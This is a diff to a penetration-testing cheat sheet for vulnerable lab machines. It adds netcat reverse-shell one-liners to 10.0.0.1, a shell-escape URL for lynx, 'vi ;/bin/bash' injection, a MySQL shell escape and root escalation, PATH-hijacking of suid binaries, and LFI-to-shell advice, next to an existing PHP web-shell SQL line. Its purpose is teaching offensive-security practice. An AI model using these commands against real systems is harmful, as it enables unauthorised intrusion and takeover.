@@ -259,7 +259,7 @@ If a webserver is running on the machine, we can start with running
 
 * Names? Possible Usernames? Possible Passwords? 
    
- Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible  names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based  on named "namemash.py" available at here which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
+ Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible  names of the employees working in the company. Now, it is common practise to have username based on your first/last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
 
  * Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
  * Using VRFY command:
@@ -327,6 +327,36 @@ If a webserver is running on the machine, we can start with running
 
  More information can be found at `Using PHP for file inclusion <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>`_
 
+ To test LFI, RFI, we can also use `Uniscan <http://tools.kali.org/web-applications/uniscan>`_ Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. 
+
+ ::
+
+  uniscan -h
+  OPTIONS:
+    -h  help
+    -u  <url> example: https://www.example.com/
+    -f  <file> list of url's
+    -b  Uniscan go to background
+    -q  Enable Directory checks
+    -w  Enable File checks
+    -e  Enable robots.txt and sitemap.xml check
+    -d  Enable Dynamic checks
+    -s  Enable Static checks
+    -r  Enable Stress checks
+    -i  <dork> Bing search
+    -o  <dork> Google search
+    -g  Web fingerprint
+    -j  Server fingerprint
+
+  usage:
+  [1] perl ./uniscan.pl -u http://www.example.com/ -qweds
+  [2] perl ./uniscan.pl -f sites.txt -bqweds
+  [3] perl ./uniscan.pl -i uniscan
+  [4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
+  [5] perl ./uniscan.pl -o "inurl:test"
+  [6] perl ./uniscan.pl -u https://www.example.com/ -r
+
+ Also, if we have unprivileged user shell, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.
 
 
 FTP Services
@@ -354,7 +384,21 @@ Remote Code Execution
  
   SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
 
-* **Reverse Shells**: Mostly taken from PentestMonkey Reverse shell cheat sheet and Reverse Shell Cheat sheet from HighOn.Coffee
+* **Reverse Shells**: Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_
+
+ * netcat (nc)
+
+  with the -e option
+
+  ::
+
+   nc -e /bin/sh 10.0.0.1 1234
+
+  without -e option
+
+  ::
+
+   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
  * PHP: We can create a new file say ( shell.php ) on the server containing
 
@@ -455,6 +499,13 @@ Remote Code Execution
 
     xhost +targetip
 
+* Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 
+
+ When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:
+ :: 
+
+  URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null
+
 Spawning a TTY Shell
 ^^^^^^^^^^^^^^^^^^^^
 
@@ -511,6 +562,14 @@ or
 .. code-block :: bash 
 
   :set shell=/bin/bash:shell
+
+ Also, if we execute
+
+ ::
+
+  vi ;/bin/bash
+
+ Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.
 
 (From within nmap)
 
@@ -576,6 +635,14 @@ Privilege esclation from g0tm1lk blog
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
    find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
 
+* Find files/ folder owned by the user
+
+ After compromising the machine with an unprivilged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.
+
+ ::
+
+  find / -user username 2> /dev/null
+  find / -group groupname 2> /dev/null
 
  **Execution of binary from Relative location than Absolute**
  If we figure out that a suid binary is running with relative locations ( for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home" )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.
@@ -603,6 +670,23 @@ Privilege esclation from g0tm1lk blog
   uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
  By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp …” -> Linux searches the filesystem according to its path (here: in /tmp first) -> Our malacious /tmp/scp gets found and executed as root -> A new bash opens with root privileges.
+
+MySQL Privilged Escalation
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If mysql ( version 4.x, 5.x ) process is running as root and we do have the mysql root password and we are an unprivilged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  
+
+**Info**
+
+* The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.
+
+* When MySQL is initialised, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.
+
+* Commands can be executed inside MySQL, however, commands are executed as the current logged in user.
+
+::
+
+  mysql> \! sh
 
 Cron.d
 ^^^^^^^
@@ -1010,6 +1094,13 @@ The below text is directly from the `here <https://www.defensecode.com/public/De
 Tips and Tricks
 ---------------
 
+* It is super important to 
+
+ * View Source of the web-page ( Ctrl+U).
+ * Inspect element of the web-page ( F12 ).
+ * See if there is any hint in the title of the web page. ( example: /Magic ).
+ * If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
+
 * run-parts 
 
  run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.
@@ -1062,7 +1153,23 @@ Tips and Tricks
    <https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores> and <https://www.digitalocean.com/    	community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats>
 
 * Cracking MD5 Hashes:  
-   Try <https://crackstation.net/>
+   Try `Crackstation <https://crackstation.net/>`_ or `ISC Reverse hash <https://isc.sans.edu/tools/reversehash.html>`_
+
+* Looking for hidden text in the images? Utilize steghide
+
+ ::
+
+  steghide version 0.5.1
+
+  the first argument must be one of the following:
+  embed, --embed          embed data
+  extract, --extract      extract data
+  info, --info            display information about a cover- or stego-file
+  info <filename>       display information about <filename>
+  encinfo, --encinfo      display a list of supported encryption algorithms
+  version, --version      display version information
+  license, --license      display steghide's license
+  help, --help            display this usage information
 
 
 * Find files by wheel/ adm users.
@@ -1105,7 +1212,7 @@ Tips and Tricks
    ---------            -------
    WORKGROUP            RED
 
-   -N : If specified, this parameter suppresses the normal password promptfrom the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
+   -N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
    -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you aretrying to reach a host on another network.
 
 
@@ -1311,8 +1418,21 @@ Tips and Tricks
 
    truecrack --truecrypt <Truecrypt File> -k SHA512 -w <Wordlist_File>
 
- and Veracrypt to open the file.
+ and Veracrypt or cryptsetup to open the file.
 
+ ::
+
+  cryptsetup open --type tcrypt <Truecrypt> <MountName>
+
+* Find recently modified files:
+
+  ::
+
+   find / -mmin -10 -type f 2>/dev/null
+
+  The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.
+
+* Sometimes, it's a good idea to look at 404 custom page also. There might be some information store.d
 
 * Getting a reverse shell from:
 
@@ -1323,4 +1443,31 @@ Tips and Tricks
 
 * If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.
 
+* Want to send a email via the SMTP server something like SMTP-Open-Relay utilize `Swaks <http://www.jetmore.org/john/code/swaks/>`_ Swiss Army Knife for SMTP.
 
+  ::
+
+   swaks --to xxxxx@example.com --from xxxxxee@example.edu --server 192.168.110.105:2525 --body "Hey Buddy How are you doing" --header "Subject: Hello! Long time"
+
+Cyber-Deception
+^^^^^^^^^^^^^^^^
+
+* `Wordpot <https://github.com/gbrindisi/wordpot>`_ : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.
+
+ ::
+
+  python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress
+
+* `FakeSMTP <http://nilhcem.com/FakeSMTP/>`_ : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.
+
+ ::
+
+  java -jar /opt/fakesmtp/target/fakeSMTP-2.1-SNAPSHOT.jar -s -b -p 2525 127.0.0.1 -o /home/WeaselLaugh
+
+* `Rubberglue <https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md>`_ : We can use Rubberglue to listen on a port such that any traffic it recieves on that port it will forward back to the client ( attacker ) on the same port.
+
+ ::
+
+  python2 /opt/honeyports/honeyports-0.4.py -p 23
+
+* `Knockd - Port-knocking server <http://www.zeroflux.org/projects/knock>`_ : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open -- since knockd listens at the link-layer level, it sees all traffic even if it's destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.
